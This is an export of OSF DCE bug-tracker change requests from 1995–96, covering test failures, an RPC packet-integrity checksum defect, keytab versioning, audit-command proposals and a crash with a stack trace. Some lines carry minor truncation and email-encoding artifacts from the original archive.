H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : eraobj001 test rgy_edit and acl_edit errors
Reported Date                 : 12/5/95
Found in Baseline             : 1.2
Found Date                    : 11/29/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[12/5/95 public]
 
These problems were seen at the end of the long (36 hour) CHO run 
in 3 out 22 runs of the eraobj001 test.    

It is suspected that these problems occurred because of failing DCE. 

Some "rgy_edit -update" and acl_edit commands fail.  

The portion of the journal of concern is as follows: 

520|0 1 16150 1 327|Attempting to authenticate the cell by seacladblu2p
520|0 1 16150 1 328|The cell is now authenticated by seacladblu2p
520|0 1 16150 1 329|Attempting to assign "M" permission in sec/org/seaclcliblu20
org for seaclcliblu21
520|0 1 16150 1 330|ERROR: Unable to assign permission for seaclcliblu21
520|0 1 16150 1 331|Attempting to authenticate the cell by seaclcliblu21
520|0 1 16150 1 332|The cell is now authenticated by seaclcliblu21
520|0 1 16150 1 333|Attempting to add seaclcliblu20prin member to org in add_to_
group_or_org
520|0 1 16150 1 334|Members seaclcliblu20prin have been ADDED properly to org se
aclcliblu20org
520|0 1 16150 1 335|ERROR: in adding member of organization
520|0 1 16150 1 336|Testing permission to delete member of organization
520|0 1 16150 1 337|Attempting to authenticate the cell by seacladblu2p
520|0 1 16150 1 338|The cell is now authenticated by seacladblu2p
520|0 1 16150 1 339|Attempting to remove "M" permission in sec/org/seaclcliblu20
org for seaclcliblu21
520|0 1 16150 1 340|ERROR: Unable to remove permission for seaclcliblu21

520|0 1 16150 1 347|Attempting to authenticate the cell by seacladblu2p
520|0 1 16150 1 348|The cell is now authenticated by seacladblu2p
520|0 1 16150 1 349|Attempting to assign "M" permission in sec/org/seaclcliblu20
org for seaclcliblu21
520|0 1 16150 1 350|Able to assign permission for seaclcliblu21
520|0 1 16150 1 351|Attempting to authenticate the cell by seaclcliblu21
520|0 1 16150 1 352|The cell is now authenticated by seaclcliblu21
520|0 1 16150 1 353|Attempting to remove seaclcliblu20prin members from org
520|0 1 16150 1 354|Members seaclcliblu20prin have been removed properly from se
aclcliblu20org
520|0 1 16150 1 355|ERROR: in deleting member of organization
520|0 1 16150 1 356|ERROR: in add_del_org()



CR Number                     : 13215
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dced
Subcomponent Name             : 
Short Description             : dcerpcrun occasional test failure
Reported Date                 : 12/5/95
Found in Baseline             : 1.2
Found Date                    : 11/29/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[12/5/95 public]
 
This problem occurred in one run out of a total of 22 during a 
continuous hours of operation test run that stressed the cell for 36 hours. 
It occurred in 1 iteration out of 9 that occurred during that particular 
run of the test.  In other words this problem is seen very seldom even 
under a considerable DCE stress. 

The client fails to report status for each rpcrun loop executed. 

The portion of the journal for the iteration with error is included here: 

520|0 1 19487 1 134|\nBEGIN ITERATION 6
520|0 1 19487 1 135|\n\nStarting sync process on clients:\n
520|0 1 19487 1 136|\tblu2\c
520|0 1 19487 1 137|\tibm_l3\c
520|0 1 19487 1 138|\tpoly\c
520|0 1 19487 1 139|\n\nStarting client wrapper process on clients:\n
520|0 1 19487 1 140|\tblu2\c
520|0 1 19487 1 141|\tibm_l3\c
520|0 1 19487 1 142|\tpoly\c
520|0 1 19487 1 143|\n\nStopping sync/wait process on clients:\n
520|0 1 19487 1 144|\tblu2\c
520|0 1 19487 1 145|\tibm_l3\c
520|0 1 19487 1 146|\tpoly\c
520|0 1 19487 1 147|\n\nWaiting for clientwait pid(s) to exit.\c
520|0 1 19487 1 148|.\c
520|0 1 19487 1 149|.\c
520|0 1 19487 1 150|\n\n
520|0 1 19487 1 151|\n\nWaiting for clientwrapper pid(s) to exit.\c
520|0 1 19487 1 152|.\c
520|0 1 19487 1 153|.\c
520|0 1 19487 1 154|\n\n
520|0 1 19487 1 155|Getting test results from database.
520|0 1 19487 1 156|D_STATUS=1, D_HOSTS=3, 89 divideby 6, CLIENTLOOPSxCONCURRENT
=15
520|0 1 19487 1 157|\nERROR: A client failed to report status for each loop exec
uted.\n
520|0 1 19487 1 158|\nEND ITERATION 6



CR Number                     : 13214
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cfg
Subcomponent Name             : dce_config
Short Description             : if /usr/include/dce does not exist, it does not do a symbolic link.
Reported Date                 : 11/29/95
Found in Baseline             : 1.1
Found Date                    : 11/29/95
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[11/29/95 public]

*** dce/src/config/dce_config	Mon May  8 10:40:07 1995
--- /tmp/dce_config	Mon Dec  4 16:57:19 1995
***************
*** 3297,3303 ****
  	# Be nice and make sure they don't already have a directory
  	issymlink /usr/include/dce
  	temp=$?
! 	if [ $? -eq 2 ]		# does not exists
  	then
  		ln -s $DCELOCAL/share/include/dce /usr/include/dce
  	elif [ $temp -eq 1 ] 	# exists and not a symlink
--- 3297,3303 ----
  	# Be nice and make sure they don't already have a directory
  	issymlink /usr/include/dce
  	temp=$?
! 	if [ $temp -eq 2 ]		# does not exists
  	then
  		ln -s $DCELOCAL/share/include/dce /usr/include/dce
  	elif [ $temp -eq 1 ] 	# exists and not a symlink



CR Number                     : 13211
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : rpc
Subcomponent Name             : runtime
Short Description             : RPC checksum errors not handled
Reported Date                 : 11/27/95
Found in Baseline             : 1.0.3, 1.1
Found Date                    : 11/22/95
Severity                      : A
Priority                      : 0
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[11/27/95 public]
Abstract: RPC recv_dispatch() does not handle checksum failures

Description:
We have encountered a very serious problem in the CN RPC runtime code,
regarding the processing of request data when using packet integrity
checking.  The basic problem is that if a data packet gets corrupted on
the wire, the checksum on the server side fails (as it should), but
simply does an fprintf() to stderr, and keeps on going!  This is clearly
manager routine, as if nothing happened.

We have a simple client/server testcase using pipes, that uses packet
integrity, and it clearly demonstrates the problem.

We can reproduce this problem by setting a breakpoint in the client RPC
runtime, and corrupting the data packet AFTER the checksum has been done.
We use an idl pipe, transfering a file from the client to the server, and
sure enough, the fprintf() statement is printed out, and the output file
will contain the corruption that we introduced.

The offending code is in cnrcvr.c, in the routine recv_dispatch().  Here is
where the problem lies:

...
...
              else
              {
atus = %x\n", auth_st);
                  if (packet_info_table[ptype].class == ASSOC_CLASS_PKT)
                  {
                      break;
                  }
              }
...
...

This is an else clause within the error handling path after the checksum has
failed.  You can see that if the packet class was association, then the
break statement causes the for loop in the receive_dispatch() routine to
be exited, and this in turn causes a FAULT PDU to be sent back to the
client.  However, when the packet is not an association class packet, the
packet is just passed on thru, and the fact that the checksum failed is
effectively ignored, except for the printf statement that might or might
no be seen on someones console.  Even so, there is no way to tell where
the checksum failure happened.

We have changed our code to eliminate the if statement, and will always do
a break if the checksum returned in error.  This has the effect of causing
the server to return an error of rpc_s_comm_failure to the client, when a
packet that is not an association class packet fails the checksum.  Not much
information, but at least it keeps the corrupted data from going unnoticed.

We are not sure if this is the proper solution though.  Somebody specifically
put in code to check for association class packets, hopefully for a reason.
When the checksum error is detected, and the packet is an association class
packet, the client gets an rpc_s_unknown_reject error.  So there are different
recovery mechanisms in place for different points in the server RPC state
machine.  Is there a better/cleaner way to handle a shutdown of an RPC when
the checksum error is detected during packet transmission?


Can you please indicate exactly where "in the client RPC"
you are "corrupting the data packet"?

>This has the effect of causing the server to return an error
>of rpc_s_comm_failure to the client packet that is not an
>association class packet fails the checksum.

It will also effectively shutdown the call, correct?  I believe
this this is what should happen in the case of a regular RPC.
In the case where we are transporting a pipe though; where
security level, packet_integrity is being requested is this
really what we want to happen here?  I think that there
is probably no other alternative except, 1). reject the packet
2) send a com failure to the client. 3. shutdown the pipe.

If you really need to guarantee this packet_integ security
you must at least drop the packet.  In the case of a pipe,
being used to transfer a file, this you don't have much
choice; this means dropping the rest of the file and
restarting the transfer.

Bob

[12/06/95 public]
You need to set a breakpoint in the client RPC runtime in the routine
rpc__cn_assoc_send_frag().  The breakpoint must be just before the
RPC_SOCKET_SENDMSG() call, after the requested authentication level
has been applied.  I have been setting the breakpoint on the while loop
that surrounds the RPC_SOCKET_SENDMSG() call.

I have been enabling the RPC DEBUG statements, and tracking rpc_e_dbg_cn_pkt,
levels 1 and 20.  Since I was using a pipe to transmit a large file, I would
let it go for a while, until I was sure it was in the process of transmitting
to file.  Then I offset into the iovector, and corrupt a few bytes out in
the middle of the data packet.  We were sending a file that consisted of
all character '\n's, so when we corrupted the packet (by overwriting a space
character over some of the '\n's, it became very easy to detect in the
destination file, after it was written out to disk.

[12/8/95 public]

The auth3 pdu which is not used by the current protocol is the only packet
caught by the above "if (packet_info_table[ptype].class ==
ASSOC_CLASS_PKT)" statement. Thus, "break" is noop. Try adding the
following "else if {...}", probably it will give you a little better
status. (No guarantee, though. I havn't tried it by myself.)

        /*
         * Finally, post the event to the appropriate state machine
         */
        if (packet_info_table[ptype].class == CALL_CLASS_PKT)
        {
            if ((ptype == RPC_C_CN_PKT_REQUEST) 
                && 
                (RPC_CN_PKT_FLAGS (pktp) & RPC_C_CN_FLAGS_FIRST_FRAG))
            {
		:
		:
            }
            else if (auth_st != rpc_s_ok)
            {
                assert(assoc->assoc_flags & RPC_C_CN_ASSOC_SERVER);
                RPC_CN_SEND_FAULT (call_r, auth_st);
                fragbuf_p = NULL;
                continue;
            }
            else
            {
                RPC_CN_POST_CALL_SM_EVENT (assoc, 
                                           packet_info_table[ptype].event, 
                                           fragbuf_p,
                                           st);
            }

[01/18/96 public]
I have implemented the code provided by Seitchi, and it does not appear to
be having any effect.  The code is being run (I ran it under the debugger,
and set a breakpoint in the server RPC runtime), but the fault pdu does not
cause the data transmission to stop.  I have not been able to do extensive
analysis of exactly what the fault pdu's effect is on the data transmission,
but a cursory look at the output data file from my file xfer testcase (using
pipes) shows that the data file was not written to after the fault pdu was
sent.  Maybe the RPC runtime was just draining the pipe?  But no error was
detected on the client side.  More investigation is necessary.

I have not had the bandwidth recently to look at the problem more.  If someone
would like my testcase, and detailed instructions on what I am doing, I can
provide that.  I have documented what I did to reproduce the problem in this
OT, above.

[02/01/96 public]

Assigned to Digital to address in the 1.2.2 timeframe.



CR Number                     : 13207
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : 
Short Description             : Rem non-exist attrib, no error
Reported Date                 : 11/17/95
Found in Baseline             : 1.1
Found Date                    : 11/17/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[11/17/95 public]

When doing a modify -remove using DCECP or a remove using CDSCP, if the named
attribute does not exists, no error is returned.  A return code of 0 is 
returned.  These commands remove the value of the attribute, not the attribute
itself, and not reporting an error if the attribute does not exist leads the
user to believe there is such as attribute.  In certain cases the whole   
attribute  would be removed by these commands, and in those cases perhaps it
is not important to let the user know the attribute didn't exist in the first
place, but in cases where the intent is to remove a value and still have an
attribute, it is misleading if success is reported when the attribute does not
exist.

The documentation for both dcecp link modify -remove and dcecp object modify
-remove says, "If an attribute or value is not present, an error is returned."
we do not get an error in either case.  Correction, link modify mentions an
error if the value does not exist, but object modify only mentions if the
attribute does not exist.



CR Number                     : 13205
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : error message invalid password
Reported Date                 : 11/16/95
Found in Baseline             : 1.1
Found Date                    : 11/16/95
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[11/16/95 public]

If a program gets 2 keys entered into the keytab file in the same 
second when the code that trys to refresh the key looks through 
the list it compares the version numbers and timestamps.  If a 
larger numbered key is found with the same timestamp it does not
think it is the latest key.

This was originally reported by the CICS development team.

Here is an explaination of the solution.

Somehow, your region managed to get two keys in the keytab with different version
numbers but the same timestamp - version 1 and version 2 were apparently written
in the same second.  The code as written walks through the keytab looking for
the entry that matchs and has the highest timestamp.  It will hit version 1 first
and then when it hits version 2 it compares the timestamps and since the timestamp
for version 2 is not greater than version 1, it doesn't think it is later.

What it needs to do is check for the case where the timestamps match, and then
choose the greater version number.  It probably should also allow for the possibility
that the version number could wrap in the 8 bit field.

Here is the solution that we implemented.

Here's how I changed the compare.  Instead of just checking ktentry.timestamp > ts
I also check the case that ktentry.timestamp == ts and the version number
is greater.  Since I want to handle the case of wrapping, I say if the difference
between the ktentry vno and the already found version is less than 128 (modulo 255)
we've got a more recent entry.  The idea is that the version numbers won't ever
get more than a few numbers apart in one second, and if we didn't wrap the difference
will be small, while if we did wrap the difference will be between -255 and -245, e.g.
0xffffff01 and 0xffffff0b, which when ANDed with 0xff gives 0x01 and 0x0b.

#if defined(AIX_PROD) || defined(IBMOS2)  /* CMVC 14949 */
                && (!found_one || (found_one && ((ktentry.timestamp > ts) ||
                ((ktentry.timestamp == ts) && (((ktentry.vno - keydata->version_number) & 0xff) < 0x
80))
))) ) {
#else
                && (!found_one || (found_one && ktentry.timestamp > ts)) ) {
#endif  /* CMVC 14949 */



CR Number                     : 13202
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : 
Short Description             : Thinkos in provider_version comments
Reported Date                 : 11/15/95
Found in Baseline             : 1.1
Found Date                    : 11/15/95
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[11/15/95 public]
Some of the provider_version() comments in DFS IDL files are erroneous,
saying only provider() rather than provider_version().  This might confuse
anybody trying to use the DFS versioning specification.

[11/15/95 public]
Fixed with Transarc delta cfe-ot13202-provider_version-comments.



CR Number                     : 13201
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dcecp
Subcomponent Name             : audit
Short Description             : support rewind of non-central trail file in 'aud rewind' command
Reported Date                 : 11/14/95
Found in Baseline             : 1.1, 1.2
Found Date                    : 11/14/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : nextrel
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[11/14/95 public]
I have noticed some problems related to dcecp aud rewind command
in DCE1.1:

  1) It only works for central_trail once auditd is up and running.
     This is because when auditd is started, it called dce_aud_open()
     to open the trail file and reset all the fields in dce_aud_trail_t
     to the central trail accordingly.  Therefore, if user wants to
     rewind the other trails such as security trail, it could not be done.

     My suggestion for this problem is:

       if the remote_trail_name is omitted from dcecp aud rewind, i.e
       dcecp> aud rewind is entered, rewind the central trail
       else
         call dce_aud_open() to open the remote_trail_name
         lock the mutex
         call dce_aud_rewind to rewind it
         unlock the mutex

  2) The syntax for dcecp aud rewind in DCE command ref. should change from

       aud rewind [remote_audit_daemon_name] to
       aud rewind [remote_audit_trail_name]

[11/14/95 public]
This is not possible. Due to 'limitations' in the design of the audit
subsystem, working with a non-central trail isn't possible.

Please explain how you can lock a mutex in another process.

This functionality would have been added into dcecp upon it's creation had
audit been able to support this.

[11/14/95 public]
Here is what I used to test it. The dce_aud_clean() is a better version of
dce_aud_rewind().  Inside my main program, I used dce_aud_open() to open the
trail file, which is predefined, and call dce_aud_clean() to reset and rewind 
the file. Therefore, if remote_audit_trail_file is entered, aud_ops.c could
do the same to rewind a file. 
I am planning to replace the content of dce_aud_rewind() with the content of
of dce_aud_clean().  


void            dce_aud_clean
                (
                                 dce_aud_trail_t at,
                                 unsigned32 * stp
) {

    /* lock the mutex */
    pthread_mutex_lock(&at->mutex);

    /* clean the audit trail file */
    if (ftruncate(at->trail_fd, 0) == -1) {
    /*  dce_svc_printf(AUD_S_CLEAR_TRAIL_FILE_MSG, at->trail_file);
        *stp = aud_s_clear_trail_file_rc; */
        pthread_mutex_unlock(&at->mutex);
        return;
    }

    /* clean the audit index file */
    if (ftruncate(at->md_index_fd, 0) == -1) {
    /*  dce_svc_printf(AUD_S_CLEAR_INDEX_FILE_MSG, at->index_file);
        *stp = aud_s_clear_index_file_rc; */
        pthread_mutex_unlock(&at->mutex);
        return;
    }

    at->trail_cursor = 0;
    at->index_cursor = 0;
    fseek(at->trail_fp, 0, SEEK_SET);
    fseek(at->md_index_fp, 0, SEEK_SET);

    /* unlock the mutex */
    pthread_mutex_unlock(&at->mutex);
    return;

}

   ....
   ....

   printf("testing dce_aud_clean.....\n\n");

   dce_aud_open(aud_c_trl_open_read,
                SEC_AUDIT_FILE,
                0,
                0,
                &Trail, &Status);

   if (Status != aud_s_ok)
   {
      printf("   failed to open %s. Status = %ld\n", SEC_AUDIT_FILE, Status);
      return;
   }

   dce_aud_clean(Trail, &Status);
   if (Status != aud_s_ok)
   {
      printf("   failed to clean %s. Status = %ld\n", SEC_AUDIT_FILE, Status);
      dce_aud_close(Trail, &St);
      return;
   }

   stat(SEC_AUDIT_FILE, &stbuf1);
   stat(SEC_INDEX_FILE, &stbuf2);

   if (stbuf1.st_size == 0 && stbuf2.st_size == 0) {
      printf("   Audit API, dce_aud_clean(), passed successfully\n\n");
   } else {
      printf("   Audit API, dce_aud_clean(), failed\n\n");
   } /* endif */

   dce_aud_close(Trail, &Status);



CR Number                     : 13198
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : prob_gd/sec.sams
Short Description             : missing "undocumented" from pad entries
Reported Date                 : 11/13/95
Found in Baseline             : 1.1
Found Date                    : 11/13/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2.2
Fixed In Baseline             : 
Affected File(s)              : security/idl/sec.sams,h/sad.sams
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[11/13/95 public]
Ward Rosenberry reports the following:

 Two appendixes at the back of the Problem Determination Guide offer
 ways to look up error message information. Appendix A organizes by
 message numbers pointing to symbolic name. Appendix B organizes by
 message text string pointing to symbolic name.  In both cases you then
 look up the actual message using the symbolic name.

 Both appendixes include many entries (mostly in the sec component)
 that point to symbolic names which don't exist in the message part of
 the book.  For instance, Appendix B has a text string
 "sec_cred_s_PAD9" pointing to symbolic name "sec_cred_s_PAD9". However
 there is no message in the main body of the book with that symbolic
 name.  There are lots of these.

Rich, please correct anything misleading I may have entered in the
above.

[11/18/95 public]
I took a look at the src/security/idl/sec.sams file and found entries
like this:
    start
    code    sec_cred_s_PADd
    text    "sec_cred_s_PADd"
    explanation    "?"
    action         "None required"
    end
The bug is that it doesn't say "start undocumented".  Which it should.
So I marked this as a doc bug; you folks will have to figure out which
components have this problem and then get the engineers to fix them.

[3/20/96 public]
This is fixed in the 1.2.1 Problem Determination Guide; that is, I
inserted the necessary "undocumented" tags in the copied (from the
tree) sams file before using it to build the book code. There is only
one such offending file, namely "sad.sams". I don't know who
the actual owner of the component is, so I'm assigning the bug to
HP and changing the fixby-date to 1.2.2.

[6/18/96 public]
It appears that sec.sams has been fixed for a while now (in 1.2.1 too).
sad.sams (the admin tool msg file) still needs to be fixed.



CR Number                     : 13194
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dcecp
Subcomponent Name             : audit
Short Description             : add/change 'audevents' command
Reported Date                 : 11/9/95
Found in Baseline             : 1.1, 1.2
Found Date                    : 11/9/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : nextrel
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[11/9/95 public]
As suggested by HP, I have implemented the following APIs in
../src/security/audit/libaudit/evt_classes.c to make audevents
command more friendly:

  1) get_event_name_from_number: Get the event name
  2) get_event_number_from_name: Get the event number
  3) input_e_table: parse the event classes (event class name,
                    event number, event name, and event description)
                    and store into a linked list.
  4) free_e_table:  free the e_table
  5) add_evt_to_e_table: insert an event into a linked list.

It would be nice if dcecp can add/change audevents as below to
take advantages of the above APIs

  o dcecp -c audevents show <event class1 event class2 ..>
  o dcecp -c audevents list 
  o dcecp -c audevents query <event number or name>

For the first command, the application program can use e_table
to retrieve the event numbers and events names within event classes.
Suggestion format:

  event class      event number  event name   event desciption
  -----------      ------------  ----------  ----------------
  event class1     evt1(hex&dec) evt1_name    evt1 description
                   evt2(hex&dec) evt2_name    evt2 description     
                   evt3(hex&dec) evt2_name    evt3 descritpion
  event class2     evt1(hex&dec) evt1_name    evt1 description
                   evt2(hex&dec) evt2_name    evt2 description

See print_e_table() for reference. 

For the second command, the application can call print_e_table() 
to dsiplay the complete list.

For the last one, the application program again can use e_table 
to retrieve and display its event class name, event number if
event name is given or event name if event number is given, and
event description.



CR Number                     : 13193
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : rpc
Subcomponent Name             : idl
Short Description             : lex problems with nidl.l on
recent versions of HPUX
Reported Date                 : 11/9/95
Found in Baseline             : 1.1
Found Date                    : 11/9/95
Severity                      : A
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1maint
Fixed In Baseline             : 1.1maint
Affected File(s)              : rpc/idl/idl_compiler/nidl.l
Sensitivity                   : public

[11/9/95 public]

There are mismatches between the prototype for yyoutput and yyunput that is
in nidl.l and the prototypes that the boilerplate ncform has in recent
versions of HPUX. There was a similar problem on AIX a couple of years ago.
The solution was to #ifdef out the nidl.l prototypes in the case of AIX and
let the boilerplate ones stand. I propose the same solution here but maybe
the old prototypes should be excised altogether - is there any platform on
which they are still needed?

In any case, here is the diff:

198,199c195,196
< #ifndef _AIX
< #if defined(SNI_SVR4)
---
> #if !defined(_AIX) && !defined(HPUX)
> #if defined(SNI_SVR4)



CR Number                     : 13192
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dcecp
Subcomponent Name             : audit
Short Description             : add search options to 'audtrail show' command
Reported Date                 : 11/9/95
Found in Baseline             : 1.1, 1.2
Found Date                    : 11/9/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : nextrel
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[11/9/95 public]
DCE Administrator sometime is interested in a particular event or
events are logged after or before certain dates.  It would be nice
if we can support the following options in audtrail show command:

  o dcecp -c audtrail show <trail> -event <event number>
  o dcecp -c audtrail show <trail> -before <date>
  o dcecp -c audtrail show <trail> -after <date>

The application program can use the second parameter, predicate, of 	
dce_aud_next() or dce_aud_prev() to match the searching criteria.



CR Number                     : 13189
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 5325
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : rpc__tower_ref_alloc SIGSEGV
Reported Date                 : 11/7/95
Found in Baseline             : 1.1
Found Date                    : 11/7/95
Severity                      : C
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[11/7/95 public]

I believe that the following problem described by ac@hal.com
MAY be a duplicate of a CR 5325 which was closed because it 
could not be duplicated. Consistently reproducible test cases
could not be documented in this case either,however, this does
look like a lingering memory leak.

From ac@hal.com Fri May 26 10:28:48 1995
 
[ text deleted ]

I would like to submit the description to you and hopefully you can shed
some lights on this problem before I open a bug report.

Our DCE1.1 went rather smoothly until QA folks applies stress testing
(combination of OSF system test cases) on the software.  Over a few hours=
 of
testing (ranges from 2 to 8 hours), some client application like cdsclerk=
,
rgy_edit, dce_login ... etc would core dump within the routine
rpc__tower_ref_alloc() which tries to perform memcpy().

It appears to us that the real cause of the problem may due to the LARGE
number of floors (num_flrs) to go through and some of those contains
garbage information which leads to the out-of-data-space address for memc=
py()
to operate with.  In the following stack trace, we see that the num_flrs
is passed with value of 49923 which is way too high when comparing to a
normal operation (I dbx a normal operation and almost all returns 5)

We suspect the data passed back from cdsd is corrupted because the
tower_octet_string contains the num_flrs information.

Does OSF or other vendor see this problem before?  If cdsd is having trou=
ble
coordinating access to its database information, what or where would you
recommend me to start looking at the cdsd code?

If you need further information, please do let me know so I can provide
additional material to you.  Thanks in advanced for your help!

Adrian Chan
ac@halsoft.com

- -----------------------stack trace of one instance-------------------

(dbx) where                                                              =
    =

=3D>[1] rpc__tower_ref_alloc(tower_octet_string =3D 0x8e4b4 "^C=C3^D ^D}^=
D=DA^A^H", num_flrs =3D 49923, start_flr =3D 1, tower_ref =3D 0xeead10fc,=
 status =3D 0xeead1f68), line 314 in "/extern_sd2/newsb/obj/sparc-solaris=
/rpc/runtime/../../../../src/rpc/runtime/comtwrref.c"
  [2] rpc__tower_to_tower_ref(tower =3D 0x8e4b0, tower_ref =3D 0xeead10fc=
, status =3D 0xeead1f68), line 343 in "/build/dce/dce/obj/sparc-solaris/r=
pc/runtime/../../../../src/rpc/runtime/comtwr.c"
  [3] rpc__bindlkup_node_get_bindings(lookup_context =3D 0x282080, bindin=
g_vector =3D 0x2d7bd0, status =3D 0xeead1f68), line 2473 in "/build/dce/d=
ce/obj/sparc-solaris/rpc/runtime/../../../../src/rpc/runtime/nslookup.c"
  [4] rpc__bindlkup_node_process(lookup_context =3D 0x282080, lookup_node=
 =3D 0xe6b08, binding_vector =3D 0x2d7bd0, status =3D 0xeead1f68), line 1=
051 in "/build/dce/dce/obj/sparc-solaris/rpc/runtime/../../../../src/rpc/=
runtime/nslookup.c"
  [5] rpc_ns_binding_lookup_next(lookup_context =3D 0x282080, binding_vec=
tor =3D 0x280fc4, status =3D 0xeead1f68), line 646 in "/build/dce/dce/obj=
/sparc-solaris/rpc/runtime/../../../../src/rpc/runtime/nslookup.c"
  [6] rpc_ns_binding_import_next(import_context =3D 0x280fc0, binding =3D=
 0x1db724, status =3D 0xeead1f68), line 370 in "/build/dce/dce/obj/sparc-=
solaris/rpc/runtime/../../../../src/rpc/runtime/nsbndimp.c"
  [7] rca_site_bind_nsi_cell_if(context =3D 0x1db718, cell_name =3D 0x2ec=
ad0 "/.../starseed_cell.dce.hal.com", if_spec =3D 0xef7600b8, status =3D =
0xeead1f68), line 1722 in "/build/dce/dce/obj/sparc-solaris/security/util=
s/../../../../src/security/client/rca/internal_binding.c"
  [8] rca_site_bind_nsi_cell(context =3D 0x1db718, cell_name =3D 0x2ecad0=
 "/.../starseed_cell.dce.hal.com", status =3D 0xeead1f68), line 1761 in "=
/build/dce/dce/obj/sparc-solaris/security/utils/../../../../src/security/=
client/rca/internal_binding.c"
  [9] rca_nsi_binding_import(context =3D 0x1db718, status =3D 0xeead1f68)=
, line 1115 in "/build/dce/dce/obj/sparc-solaris/security/utils/../../../=
=2E./src/security/client/rca/internal_binding.c"
  [10] rca_site_bind(site_name =3D 0xeead1a37 "/.../starseed_cell.dce.hal=
=2Ecom", auth_info =3D 0xeead2b74, flags =3D 3, if_spec =3D (nil), princ =
=3D 0xef76b658 "dce-rgy", cell =3D (nil), context =3D 0xeead2b70, status =
=3D 0xeead1f68), line 2293 in "/build/dce/dce/obj/sparc-solaris/security/=
utils/../../../../src/security/client/rca/internal_binding.c"
  [11] sec_rgy_site_bind(site_name =3D 0xeead1f6d "", auth_info =3D 0xeea=
d2b74, context =3D 0xeead2b70, status =3D 0xeead1f68), line 163 in "/buil=
d/dce/dce/obj/sparc-solaris/security/utils/../../../../src/security/clien=
t/rca/binding.c"
  [12] sec_rgy_site_bind_query(site_name =3D 0xeead1f6d "", auth_info =3D=
 0xeead2b74, context =3D 0xeead2b70, status =3D 0xeead1f68), line 228 in =
"/build/dce/dce/obj/sparc-solaris/security/utils/../../../../src/security=
/client/rca/binding.c"
  [13] sec_krb_sec_parse_name(context =3D 0x2f5808, level =3D 5, name =3D=
 0x18a820 "/.../starseed_cell.dce.hal.com/hosts/starseed/cds-server", par=
sed_name =3D 0x2f11a0), line 416 in "/build/dce/dce/obj/sparc-solaris/sec=
urity/utils/../../../../src/security/utils/sec_authn.c"
  [14] rpc__krb_bnd_set_auth(server_name =3D 0x18a820 "/.../starseed_cell=
